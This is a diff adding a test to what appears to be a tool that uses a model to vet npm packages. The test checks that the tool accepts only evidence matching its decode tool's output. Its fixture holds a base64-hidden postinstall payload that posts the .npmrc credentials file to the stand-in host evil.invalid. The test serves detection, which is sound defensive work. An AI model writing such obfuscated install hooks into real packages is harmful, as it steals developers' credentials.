@@ -138,6 +138,23 @@ def test_rerun_sandbox_with_ci_reveals_dormant_code():
     assert any(e.type == "sandbox" and e.verified for e in inv.evidence)
 
 
+def test_decoded_evidence_is_checked_against_what_decode_returned():
+    payload = 'fetch("https://evil.invalid/c", {body: require("fs").readFileSync(".npmrc")})'
+    blob = base64.b64encode(payload.encode()).decode()
+    m = material(CLEAN_RUN, scripts={"postinstall": "node b.js"}, **{"b.js": f'new Function(Buffer.from("{blob}", "base64").toString())();\n'})
+    model = FakeModel([
+        [("decode", {"format": "base64", "file": "b.js", "line": 1})],
+        [verdict("block", [
+            {"type": "decoded", "detail": "the hidden code posts .npmrc", "quote": 'readFileSync(".npmrc")'},
+            {"type": "decoded", "detail": "invented", "quote": "process.env.AWS_SECRET_ACCESS_KEY"},
+        ])],
+    ])
+    inv = investigate(m, model, "x")
+    assert inv.verdict == "block"
+    assert [e.quote for e in inv.evidence] == ['readFileSync(".npmrc")']
+    assert inv.rejected and "decode tool" in inv.rejected[0].why_rejected
+
+
 def test_sandbox_quote_with_non_ascii_text_is_verified():
     m = material(LEAKY_RUN)
     model = FakeModel([[verdict("block", [{"type": "sandbox", "detail": "token leaked",
